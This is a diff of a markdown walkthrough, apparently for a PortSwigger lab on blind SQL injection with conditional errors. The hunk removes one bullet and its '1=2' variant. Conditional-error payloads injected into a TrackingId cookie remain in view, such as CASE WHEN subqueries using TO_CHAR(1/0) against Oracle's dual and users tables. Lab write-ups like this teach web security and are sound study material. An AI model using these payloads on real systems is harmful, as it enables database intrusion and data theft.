@@ -126,10 +126,6 @@ TrackingId=xyz' ||(SELECT NULL FROM users WHERE ROWNUM = 1)--
 ```
 TrackingId=xyz'||(SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE 'test' END FROM dual)--
 ```
-- but we can fix this condition by changing it to `1=2` to execute the action of `'test'`.
-```
-TrackingId=xyz'||(SELECT CASE WHEN 1=2 THEN TO_CHAR(1/0) ELSE 'test' END FROM dual)--
-```
 - You can check out the conditional errors payloads for different databases from the [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 - So now we will check if the administrator is in the `users` table or not by using the condition `1=1`.
 ```
